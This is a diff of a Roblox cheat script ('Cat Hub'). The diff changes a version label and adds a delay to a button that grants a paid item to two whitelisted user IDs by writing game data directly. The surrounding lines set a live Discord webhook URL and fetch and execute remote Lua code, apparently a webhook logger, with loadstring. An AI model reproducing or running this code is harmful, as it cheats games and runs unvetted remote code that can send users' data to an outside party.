@@ -3,7 +3,7 @@ getgenv().WebhookHere = "https://discord.com/api/webhooks/1064831805267660831/hL
 loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/WebHook4003.lua"))()
 
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib("Cat Hub V 1.8.6 | This Gui Made By Cat#2728", "DarkTheme")
+local Window = Library.CreateLib("Cat Hub V 1.8.7 | This Gui Made By Cat#2728", "DarkTheme")
 
 local Main = Window:NewTab("Npc")
 local MainSection = Main:NewSection("Npc Stuff")
@@ -273,6 +273,7 @@ end)
 
 MainSection:NewButton("Free Cestus", "Gives Free Cestus To White Listed", function()
 game:GetService("Workspace").UserData["User_428940874"].Data["PlayerHas_Seastone Cestus"].Value = true
+wait(1)
 game:GetService("Workspace").UserData["User_2717537383"].Data["PlayerHas_Seastone Cestus"].Value = true
 end)
 
